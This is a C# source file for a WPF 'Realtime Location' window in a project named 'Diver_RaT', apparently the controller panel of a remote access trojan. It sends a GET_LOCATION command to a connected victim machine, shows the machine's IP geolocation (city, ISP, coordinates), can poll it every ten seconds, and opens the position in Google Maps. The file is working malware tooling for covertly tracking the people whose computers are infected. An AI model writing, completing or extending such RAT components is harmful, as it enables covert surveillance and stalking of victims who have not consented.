using System;
using System.Diagnostics;
using System.Text.Json;
using System.Windows;
using System.Windows.Threading;

namespace Diver_RaT
{
    public partial class LocationWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _timer;
        private bool _fetching;
        private double _lat;
        private double _lon;
        private bool _hasCoords;

        public LocationWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Realtime Location - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _timer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(10) };
            _timer.Tick += (_, _) => _ = RefreshAsync();

            _ = RefreshAsync();
        }

        private async System.Threading.Tasks.Task RefreshAsync()
        {
            if (_fetching) return;
            _fetching = true;
            try
            {
                StatusText.Text = "Resolving location...";
                var result = await _server.SendCommandAsync(_device.Id, "GET_LOCATION", timeoutMs: 15000);
                if (!result.Success)
                {
                    StatusText.Text = $"Failed: {result.Error}";
                    return;
                }

                using var doc = JsonDocument.Parse(result.Result ?? "{}");
                var root = doc.RootElement;
                var status = root.TryGetProperty("status", out var st) ? st.GetString() : "";
                if (status != "success")
                {
                    var msg = root.TryGetProperty("message", out var me) ? me.GetString() : "unknown";
                    StatusText.Text = $"Location lookup failed: {msg}";
                    return;
                }

                IpValue.Text = Get(root, "query", "?");
                CountryValue.Text = Get(root, "country", "?");
                RegionValue.Text = Get(root, "regionName", "?");
                CityValue.Text = Get(root, "city", "?");
                IspValue.Text = Get(root, "isp", "?");
                OrgValue.Text = Get(root, "org", "?");
                _lat = root.TryGetProperty("lat", out var la) ? la.GetDouble() : 0;
                _lon = root.TryGetProperty("lon", out var lo) ? lo.GetDouble() : 0;
                _hasCoords = _lat != 0 || _lon != 0;
                CoordValue.Text = _hasCoords ? $"{_lat:F4}, {_lon:F4}" : "?";
                UpdatedValue.Text = DateTime.Now.ToString("HH:mm:ss");

                MapsButton.IsEnabled = _hasCoords;
                StatusText.Text = "Location resolved.";
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Failed: {ex.Message}";
            }
            finally
            {
                _fetching = false;
            }
        }

        private static string Get(JsonElement root, string prop, string fallback) =>
            root.TryGetProperty(prop, out var e) && e.ValueKind == JsonValueKind.String ? e.GetString() ?? fallback : fallback;

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = RefreshAsync();

        private void Realtime_Changed(object sender, RoutedEventArgs e)
        {
            if (RealtimeCheck.IsChecked == true) _timer.Start();
            else _timer.Stop();
        }

        private void MapsButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_hasCoords) return;
            var url = $"https://www.google.com/maps?q={_lat.ToString("F4", System.Globalization.CultureInfo.InvariantCulture)},{_lon.ToString("F4", System.Globalization.CultureInfo.InvariantCulture)}";
            Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
        }

        protected override void OnClosed(EventArgs e)
        {
            _timer.Stop();
            base.OnClosed(e);
        }
    }
}
